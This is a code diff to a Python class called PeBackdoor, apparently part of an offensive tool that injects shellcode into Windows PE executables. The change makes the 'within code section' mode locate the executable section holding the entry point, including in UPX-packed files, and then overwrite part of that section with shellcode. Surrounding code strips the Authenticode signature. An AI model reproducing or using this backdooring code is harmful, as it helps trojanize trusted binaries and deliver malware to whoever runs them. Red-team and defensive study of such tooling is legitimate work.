@@ -474,7 +474,7 @@ class PeBackdoor:
 
         self.logger.ok('PE executable Authenticode signature removed.')
         return True
-
+    
     def injectShellcode(self):
         if self.saveMode == int(PeBackdoor.SupportedSaveModes.NewPESection):
             self.pe.write(self.outfile)
@@ -494,42 +494,60 @@ class PeBackdoor:
             return True
 
         elif self.saveMode == int(PeBackdoor.SupportedSaveModes.WithinCodeSection):
+            entrypoint = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
+            section = None
+
             for sect in self.pe.sections:
                 name = sect.Name.decode()
-                self.logger.dbg(f'Checking if section is executable: {name}')
+                self.logger.dbg("Checking if section is executable: {}: 0x{:x}".format(name, sect.Characteristics))
 
-                if sect.Characteristics & 0x20 != 0:    
-                    self.logger.dbg(f'Backdooring {name} section.')
+                # 0x20 = code
+                # 0x20000000 = executable
+                if sect.Characteristics & 0x20000000 != 0:
+                #if sect.Characteristics & 0x20 != 0:
+                    # make sure its really the destination section
+                    #   UPX packed files have UPX0, UPX1, where the latter has the entry point
+                    #self.logger.dbg("--> 0x{:x} 0x{:x} 0x{:x}".format(
+                    #    entrypoint,
+                    #    sect.VirtualAddress,
+                    #    sect.VirtualAddress + sect.SizeOfRawData,
+                    #))
+                    if entrypoint > sect.VirtualAddress and entrypoint < sect.VirtualAddress + sect.SizeOfRawData:
+                        section = sect
+                        break
 
-                    if sect.Misc_VirtualSize < len(self.shellcodeData):
-                        self.logger.fatal(f'''Input shellcode is too large to fit into target PE executable code section!
-    Shellcode size    : {len(self.shellcodeData)}
-    Code section size : {sect.Misc_VirtualSize}
+            if section != None:
+                self.logger.dbg(f'Backdooring {name} section.')
+
+                if sect.Misc_VirtualSize < len(self.shellcodeData):
+                    self.logger.fatal(f'''Input shellcode is too large to fit into target PE executable code section!
+Shellcode size    : {len(self.shellcodeData)}
+Code section size : {sect.Misc_VirtualSize}
 ''')
 
-                    offset = int((sect.Misc_VirtualSize - len(self.shellcodeData)) / 2)
-                    self.logger.dbg(f'Inserting shellcode into 0x{offset:x} offset.')
+                offset = int((sect.Misc_VirtualSize - len(self.shellcodeData)) / 2)
+                self.logger.dbg(f'Inserting shellcode into 0x{offset:x} offset.')
 
-                    self.pe.set_bytes_at_offset(offset, self.shellcodeData)
-                    self.shellcodeOffset = offset
-            
-                    rva = self.pe.get_rva_from_offset(offset)
+                self.pe.set_bytes_at_offset(offset, self.shellcodeData)
+                self.shellcodeOffset = offset
+        
+                rva = self.pe.get_rva_from_offset(offset)
 
-                    p = sect.PointerToRawData + sect.SizeOfRawData - 64
-                    graph = textwrap.indent(f'''
+                p = sect.PointerToRawData + sect.SizeOfRawData - 64
+                graph = textwrap.indent(f'''
 Beginning of {name}:
 {textwrap.indent(hexdump(self.pe.get_data(sect.VirtualAddress), sect.VirtualAddress, 64), "0")}
-    
+
 Injected shellcode in the middle of {name}:
 {hexdump(self.shellcodeData, offset, 64)}
-    
+
 Trailing {name} bytes:
 {hexdump(self.pe.get_data(self.pe.get_rva_from_offset(p)), p, 64)}
 ''', '\t')
 
-                    self.logger.ok(f'Shellcode injected into existing code section at RVA 0x{rva:x}')
-                    self.logger.dbg(graph)
-                    return True
+                self.logger.ok(f'Shellcode injected into existing code section at RVA 0x{rva:x}')
+                self.logger.dbg(graph)
+                return True
 
         return False
 
